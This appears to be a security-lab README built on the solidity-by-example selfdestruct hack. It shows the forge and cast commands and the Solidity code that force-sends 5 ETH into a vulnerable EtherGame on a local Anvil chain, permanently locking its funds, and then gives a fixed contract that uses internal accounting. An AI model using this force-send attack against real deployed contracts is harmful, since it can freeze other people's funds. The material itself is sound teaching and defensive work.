## Self Destruct Vulnerability

**Reference:** https://solidity-by-example.org/hacks/self-destruct/

This demonstrates how the `selfdestruct` function can be weaponized to **force-send ETH** to any contract, breaking logic that relies on `address(this).balance` for critical decisions.

### 🎯 The Vulnerability

**What is `selfdestruct`?**

`selfdestruct` is a Solidity function that:
- Deletes a contract from the blockchain
- Sends all remaining ETH to a designated address
- **Cannot be blocked or prevented** by the receiving contract

**The Danger:**

Contracts can be deleted from the blockchain by calling `selfdestruct`. When called, `selfdestruct` sends all remaining Ether stored in the contract to a designated address.

**Vulnerability:** A malicious contract can use `selfdestruct` to force-send Ether to any contract, bypassing all checks and functions like `receive()` or `deposit()`.

**Why This Breaks Contracts:**

If a contract relies on `address(this).balance` for logic (like game rules, reward calculations, etc.), an attacker can manipulate this balance arbitrarily using `selfdestruct`, breaking the intended behavior.

---

### 🚀 Setup

**Start Anvil (local blockchain)**

```bash
anvil
```

**Compile code**
```bash
forge build
```

---

### 🎮 The Game: EtherGame

**Game Rules:**
- The goal is to be the 7th player to deposit 1 Ether
- Players can deposit only 1 Ether at a time
- The 7th player (who brings the balance to exactly 7 ETH) becomes the winner
- The winner can withdraw all Ether

**Sounds simple, right? Let's see how it can be broken!** ⚔️

---

### 📝 Step 1: Deploy EtherGame

```bash
forge create src/selfDestruct/SelfDestruct.sol:EtherGame \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

---

### 👥 Step 2: Alice and Bob Join the Game

Two honest players decide to play the game and deposit 1 ETH each.

#### Alice Deposits 1 ETH

**Alice's Details:**
- Address: `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`
- Private Key: `0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80`

**Check initial balance:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
```

0.000000000000000000 ETH

**Alice deposits:**

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "deposit()" \
  --value 1ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

**Verify balance:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
```
1.000000000000000000 ETH


#### Bob Deposits 1 ETH

**Bob's Details:**
- Address: `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`
- Private Key: `0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d`

**Bob deposits:**

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "deposit()" \
  --value 1ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```
**Verify balance:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
```
2.000000000000000000 ETH

💡 **Game Status:** 2/7 ETH deposited. Need 5 more players to reach the target!

---

### 😈 Step 3: Deploy Attack Contract

**Attacker's Details:**
- Address: `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`
- Private Key: `0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a`

```bash
forge create src/selfDestruct/SelfDestruct.sol:Attack \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3

  # Contract deployed to: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
```

---

### 💣 Step 4: Execute the Attack

The attacker sends 5 ETH to break the game!

```bash
cast send 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
  "attack()" \
  --value 5ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
```

**Verify EtherGame balance:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
```
# 7.000000000000000000

**🎯 The game balance jumped from 2 ETH to 7 ETH instantly!**

**But there's NO winner!** The game is now permanently broken. 🔒

---

### 🔍 How the Attack Works

#### The Vulnerable Code

```solidity
function deposit() public payable {
    require(msg.value == 1 ether, "You can only send 1 Ether");
    
    uint256 balance = address(this).balance;  // ⚠️ Uses actual balance!
    require(balance <= TARGET_AMOUNT, "Game is over");
    
    if (balance == TARGET_AMOUNT) {  // ← Sets winner
        winner = msg.sender;
    }
}
```

The contract relies on `address(this).balance` to track game progress.

#### The Attack Mechanism

**Step 1: Attack Contract Receives 5 ETH**

The attacker sends 5 ETH to the Attack contract via the `attack()` function.

**Step 2: `selfdestruct` Force-Sends ETH**

```solidity
function attack() public payable {
    address payable addr = payable(address(etherGame));
    selfdestruct(addr);  // ← Destroys contract and sends all ETH
}
```

**What `selfdestruct` does:**
- ✅ Destroys the Attack contract
- ✅ **Forcibly sends all its ETH** (5 ETH) to EtherGame
- ✅ **Bypasses all checks** - doesn't call `deposit()`!
- ✅ Cannot be prevented or blocked

**Step 3: Game Balance Calculation**

```
EtherGame balance = 2 ETH (Alice + Bob via deposit())
                  + 5 ETH (forced via selfdestruct)
                  = 7 ETH total
```

**Step 4: Game is Broken**

- ❌ Balance = 7 ETH (target reached)
- ❌ But `winner` was **never set**! (line 30 never executed)
- ❌ No one can deposit anymore:
  - Anyone trying to deposit 1 ETH would make balance = 8 ETH
  - `require(balance <= TARGET_AMOUNT)` would fail
- ❌ `claimReward()` can't be called (no winner set)
- ❌ **7 ETH locked forever!**

#### Visual Attack Flow

```
Normal Game Flow:
├─ Player 1 deposits 1 ETH → balance = 1 ETH
├─ Player 2 deposits 1 ETH → balance = 2 ETH
├─ ...
├─ Player 6 deposits 1 ETH → balance = 6 ETH
└─ Player 7 deposits 1 ETH → balance = 7 ETH → Winner set! ✅

Attack Flow:
├─ Alice deposits 1 ETH → balance = 1 ETH
├─ Bob deposits 1 ETH → balance = 2 ETH
└─ Attacker selfdestructs with 5 ETH → balance = 7 ETH
    ├─ No winner set ❌
    ├─ Can't deposit anymore ❌
    └─ Funds locked forever ❌
```

---

### 🛡️ Prevention Techniques

**Don't rely on `address(this).balance`!**

Instead, use an internal accounting variable to track deposited amounts:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract EtherGame {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    uint256 public balance;  // ✅ Internal accounting
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;  // ✅ Track deposits internally
        require(balance <= TARGET_AMOUNT, "Game is over");

        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        uint256 amount = balance;
        balance = 0;
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

**Why this works:**

- ✅ `balance` only increases through `deposit()` function
- ✅ `selfdestruct` can still send ETH, but it won't affect `balance` variable
- ✅ Game logic remains intact even if extra ETH is force-sent
- ✅ Winner can still claim their reward

**Example:**
- Alice deposits 1 ETH → `balance = 1`, actual ETH = 1
- Bob deposits 1 ETH → `balance = 2`, actual ETH = 2
- Attacker selfdestructs 5 ETH → `balance = 2` (unchanged!), actual ETH = 7
- Game continues normally based on `balance` variable
- Player 7 deposits 1 ETH → `balance = 7` → Winner set! ✅

---

### 📋 Best Practices

1. **Never use `address(this).balance` for critical logic**
   - It can be manipulated via `selfdestruct`
   - Also affected by miner rewards and forced transfers

2. **Use internal accounting variables**
   - Track balances with state variables
   - Only update them through controlled functions

3. **Be aware of force-send methods:**
   - `selfdestruct` (main culprit)
   - Miner/validator rewards (coinbase transactions)
   - Pre-sent ETH to calculated contract addresses (before deployment)

4. **Design defensively:**
   - Assume attackers can send arbitrary amounts of ETH
   - Don't make assumptions about contract balance

---

### 🎯 Key Takeaways

- ✅ `selfdestruct` force-sends ETH and cannot be blocked
- ✅ Never rely on `address(this).balance` for business logic
- ✅ Use internal accounting with state variables
- ✅ This vulnerability can lock funds permanently
- ✅ Even though `selfdestruct` is deprecated in newer EVM versions, similar force-send methods exist

**Remember:** Any contract can receive ETH at any time, whether it wants to or not. Design your contracts to handle this reality!

---

### ⚠️ Note on `selfdestruct` Deprecation

As of recent Ethereum upgrades (EIP-6049), `selfdestruct` is being deprecated and may behave differently in the future. However:

- Legacy contracts still use it
- The principle of "never trust `address(this).balance`" remains critical
- Other force-send methods exist (miner rewards, pre-deployment transfers)

**The lesson:** Always use internal accounting for critical logic!
